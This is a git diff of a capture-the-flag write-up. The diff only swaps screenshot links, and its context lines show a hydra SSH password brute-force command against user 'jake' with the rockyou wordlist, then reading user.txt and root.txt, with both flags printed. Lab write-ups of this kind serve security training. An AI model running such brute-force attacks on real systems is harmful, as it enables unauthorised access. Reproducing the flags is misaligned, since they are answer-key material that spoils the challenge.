@@ -34,7 +34,7 @@ Assuming that jake is Jake's username, we can use hydra and a wordlist to discov
 ```
 hydra -l jake -P /usr/share/wordlists/rockyou.txt <ip_address> ssh
 ```
-![screenshot](https://github.com/nicholasingle/ctf-writeups/blob/main/images/Screenshot%20(4).png) \
+![screenshot](https://github.com/nicholasingle/ctf-writeups/blob/main/images/Screenshot%20(12).png) \
 Looks like we got his password, Holt will in fact be mad.
 
 **Step 5: SSH** \
@@ -53,7 +53,7 @@ cd /home/holt
 ls -lah
 cat user.txt
 ```
-![screenshot](https://github.com/nicholasingle/ctf-writeups/blob/main/images/Screenshot%20(6).png) \
+![screenshot](https://github.com/nicholasingle/ctf-writeups/blob/main/images/Screenshot%20(13).png) \
 User Flag: **ee11cbb19052e40b07aac0ca060c23ee**
 
 **Step 7: Privilege Escalation** \
@@ -87,7 +87,7 @@ cd /root
 ls -lah
 cat root.txt
 ```
-![screenshot](https://github.com/nicholasingle/ctf-writeups/blob/main/images/Screenshot%20(11).png) \
+![screenshot](https://github.com/nicholasingle/ctf-writeups/blob/main/images/Screenshot%20(14).png) \
 Root Flag: 63a9f0ea7bb98050796b649e85481845
 
 ## Conclusion
